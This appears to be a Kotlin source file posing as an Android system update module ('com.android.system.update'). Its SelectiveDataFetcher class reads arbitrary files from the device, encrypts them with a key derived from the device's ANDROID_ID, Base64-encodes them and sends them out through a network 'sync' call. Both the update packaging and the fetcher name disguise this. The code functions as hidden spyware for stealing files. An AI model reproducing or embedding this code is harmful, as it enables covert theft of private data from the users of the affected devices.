package com.android.system.update.modules.data

import android.content.Context
import android.provider.Settings
import android.util.Base64
import com.android.system.update.core.NetworkConnectionManager
import java.io.File
import java.security.MessageDigest
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class SelectiveDataFetcher(private val context: Context) {

    private val random = SecureRandom()
    private val networkManager = NetworkConnectionManager(context)
    private val deviceKey: ByteArray

    init {
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "default"
        deviceKey = MessageDigest.getInstance("SHA-256").digest(androidId.toByteArray())
    }

    fun fetchFile(filePath: String) {
        val file = File(filePath)
        if (!file.exists() || !file.isFile) return
        val data = file.readBytes()
        val encrypted = encrypt(data)
        val payload = Base64.encodeToString(encrypted, Base64.NO_WRAP)
        networkManager.sync(payload)
    }

    private fun encrypt(data: ByteArray): ByteArray {
        val iv = ByteArray(12).also { random.nextBytes(it) }
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        val spec = GCMParameterSpec(128, iv)
        cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(deviceKey, "AES"), spec)
        val encrypted = cipher.doFinal(data)
        return iv + encrypted
    }
}